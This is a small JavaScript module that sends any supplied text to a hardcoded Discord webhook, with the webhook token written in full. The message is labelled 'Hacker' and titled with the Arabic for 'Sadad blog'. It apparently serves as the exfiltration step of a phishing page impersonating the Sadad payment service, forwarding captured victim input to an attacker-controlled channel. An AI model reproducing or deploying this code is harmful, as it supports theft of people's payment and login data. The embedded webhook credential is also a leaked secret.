import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324360978049269841/EWkwZLss1QcqqgdAciYWmsOeIH8CQHNyt71FtmzZMytPzGnLdKSS4IQXB6XMghzkL_oS",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
